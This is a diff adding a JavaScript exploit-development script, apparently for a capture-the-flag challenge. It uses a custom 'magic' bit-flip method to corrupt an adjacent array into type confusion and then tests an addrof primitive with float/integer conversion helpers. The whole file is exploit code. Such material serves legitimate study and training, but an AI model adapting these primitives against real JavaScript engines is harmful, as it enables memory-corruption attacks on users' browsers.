@@ -1,0 +1,53 @@
+1527
+// Find the right corruption
+const buf = new ArrayBuffer(8);
+const f64 = new Float64Array(buf);
+const u64 = new BigUint64Array(buf);
+
+function d2u(d) {
+    f64[0] = d;
+    return u64[0];
+}
+
+function u2d(u) {
+    u64[0] = u;
+    return f64[0];
+}
+
+// Try to find adjacent arrays where we can create addrof/fakeobj
+let found = false;
+for (let attempt = 0; attempt < 0x10000 && !found; attempt++) {
+    let a = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
+    let b = [{a:1}, {b:2}, {c:3}, {d:4}];
+    
+    // Store original value
+    let orig_b0 = b[0];
+    
+    // Try flipping bit 33 at offset a.length
+    a.magic(a.length, 33);
+    
+    // Check if b changed to return numbers
+    if (typeof b[0] === 'number' && b[0] !== 0) {
+        console.log("=== SUCCESS at attempt " + attempt + " ===");
+        console.log("b is now corrupted!");
+        console.log("b[0] type:", typeof b[0]);
+        console.log("b[0] value:", b[0]);
+        console.log("b[0] hex:", '0x' + d2u(b[0]).toString(16));
+        
+        // Now test if we can do addrof
+        let test_obj = {test: "marker"};
+        a[0] = 99.99;  // Put known value in a
+        b[0] = test_obj;  // Put object in b
+        
+        console.log("After setting b[0] to test_obj:");
+        console.log("a[0] =", a[0], "hex:", '0x' + d2u(a[0]).toString(16));
+        console.log("b[0] =", b[0]);
+        
+        found = true;
+        break;
+    }
+}
+
+if (!found) {
+    console.log("Could not achieve type confusion");
+}
